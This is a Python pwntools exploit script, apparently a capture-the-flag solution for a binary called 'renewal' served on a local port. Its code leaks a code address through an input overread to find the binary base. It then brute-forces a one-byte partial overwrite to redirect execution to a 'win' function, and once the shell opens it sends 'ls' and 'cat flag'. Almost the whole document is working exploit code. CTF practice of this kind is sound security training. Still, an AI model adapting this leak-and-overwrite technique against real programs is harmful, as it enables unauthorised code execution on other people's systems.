from pwn import *

elf = ELF("../dist/renewal")
libc = ELF('../dist/libc-2.31.so')

while(1):
    try:
        # io = process("../dist/renewal")
        io = remote("localhost", 30017)

        # pause()
        io.sendlineafter(b"Name > ", b"A")
        io.sendlineafter(b"Words > ", b"B")
        io.sendlineafter(b"Age > ", b"256")
        io.sendlineafter(b"Job > ", b"C" * (0x10 - 3) + b"END")
        io.recvuntil(b"END")
        text_addr = io.recvline()[:-1]
        text_addr = u64(text_addr + b"\x00" * (8 - len(text_addr)))
        print(hex(text_addr))
        text_base = text_addr - 0x12b9
        print("text base is {}".format(hex(text_base)))

        io.sendlineafter(b"> ", b"4")

        # 1/16
        one_byte = 0x40
        io.sendlineafter(b"> ", b"C" * 0x18 + p32(0x4) + p32(0xffffffff)+ p8(one_byte))

        win_addr = text_base + elf.symbols['win']
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"> ", p64(win_addr + 5))
        io.sendlineafter(b"?\n", b"YES")
        io.sendlineafter(b"!\n", b"ls")
        io.sendlineafter(b"flag", b"cat flag")
        break
    except EOFError as e:
        print(e)
        io.close()


io.interactive()
